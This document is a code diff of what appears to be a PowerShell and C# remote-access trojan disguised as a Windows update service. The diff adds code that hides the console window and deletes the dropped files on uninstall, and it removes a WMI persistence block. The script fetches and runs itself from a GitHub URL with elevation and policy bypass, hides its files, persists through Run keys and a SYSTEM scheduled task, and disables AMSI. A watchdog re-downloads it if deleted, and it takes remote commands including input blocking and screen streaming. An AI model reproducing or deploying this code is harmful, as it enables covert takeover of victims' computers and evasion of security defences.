@@ -8,11 +8,20 @@ $serverPort = 4000
 $installName = "WinUpdateSvc"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
+# ===== VERIFICAR ADMIN =====
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
     exit
 }
+
+# ===== ESCONDE A JANELA DO POWERSHELL NA HORA =====
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0) # 0 = SW_HIDE
 
 # ===== CAMINHOS E VBS WRAPPER =====
 $dir = "$env:ProgramData\Microsoft\Windows\Caches"
@@ -26,20 +35,17 @@ try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 $vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
 Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
 
-# Oculta os arquivos no sistema
 attrib +h +s +r $scriptPath 2>$null
 attrib +h +s +r $vbsPath 2>$null
 
 # ===== PERSISTÊNCIA E AUTO-REPARO =====
 function Install-Persistence {
-    # 1. Registro (HKCU e HKLM)
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 2. Agendador de Tarefas (Roda como SYSTEM no Boot e a cada 5 min)
     try {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
         $trigger1 = New-ScheduledTaskTrigger -AtStartup
@@ -49,24 +55,10 @@ function Install-Persistence {
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
         Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" -Action $action -Trigger $trigger1,$trigger2,$trigger3 -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
-
-    # 3. WMI Event Subscription
-    try {
-        $filterName = "WindowsUpdateFilter"
-        $consumerName = "WindowsUpdateConsumer"
-        Get-WmiObject __eventFilter -namespace root\subscription -filter "name='$filterName'" -ErrorAction SilentlyContinue | Remove-WmiObject
-        Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='$consumerName'" -ErrorAction SilentlyContinue | Remove-WmiObject
-        $query = "SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-        $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{ Name = $filterName; EventNameSpace = 'root\cimv2'; QueryLanguage = "WQL"; Query = $query }
-        $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{ Name = $consumerName; CommandLineTemplate = "wscript.exe //B //Nologo `"$vbsPath`"" }
-        Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{ Filter = $WMIEventFilter; Consumer = $WMIEventConsumer } -ErrorAction SilentlyContinue | Out-Null
-    } catch {}
 }
 
-# Instala a persistência na primeira execução
 Install-Persistence
 
-# ===== AMSI BYPASS =====
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -104,8 +96,6 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
-            
-            // Inicia a Thread de Auto-Reparo (Watchdog)
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
 
             while (true) {
@@ -135,7 +125,6 @@ if (-not ("R9KAgent" -as [type])) {
             
             while (true) {
                 try {
-                    // Se o arquivo foi deletado, recria
                     if (!File.Exists(scriptPath)) {
                         string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
                         using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
@@ -147,7 +136,6 @@ if (-not ("R9KAgent" -as [type])) {
                         File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
                     }
 
-                    // Se a chave do registro foi deletada, recria
                     string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
                     using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
@@ -156,7 +144,7 @@ if (-not ("R9KAgent" -as [type])) {
                         if (rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
                     }
                 } catch {}
-                Thread.Sleep(5000); // Verifica a cada 5 segundos
+                Thread.Sleep(5000);
             }
         }
 
@@ -210,13 +198,16 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; Send("STREAM_STOPPED"); return; }
                 
-                // DESINSTALAÇÃO DEFINITIVA
                 if (cmd == "uninstall") { 
                     BlockInput(false); 
                     try {
                         using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { rk.DeleteValue("WinUpdateSvc", false); }
                         Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
+                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
+                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
+                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
+                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
                     } catch {}
                     Environment.Exit(0); 
                 }
